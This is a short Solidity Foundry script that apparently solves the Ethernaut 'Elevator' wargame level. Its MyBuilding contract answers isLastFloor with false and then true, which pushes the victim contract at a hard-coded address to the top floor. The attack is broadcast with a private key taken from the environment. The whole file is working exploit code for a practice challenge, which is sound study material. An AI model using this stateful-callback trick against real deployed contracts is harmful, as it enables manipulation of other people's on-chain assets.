// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/11_Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MyBuilding {
    bool private mySwitch;
    Elevator public victim =
        Elevator(0x823Ea43d2315Fc62fbd2f07dA2A5C56354334871);

    function startAttack() external {
        victim.goTo(0);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (!mySwitch) {
            mySwitch = true;
            return false;
        } else {
            return true;
        }
    }
}

contract ElevatorAttack is Elevator, Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MyBuilding myBuilding = new MyBuilding();
        myBuilding.startAttack();
        vm.stopBroadcast();
    }
}
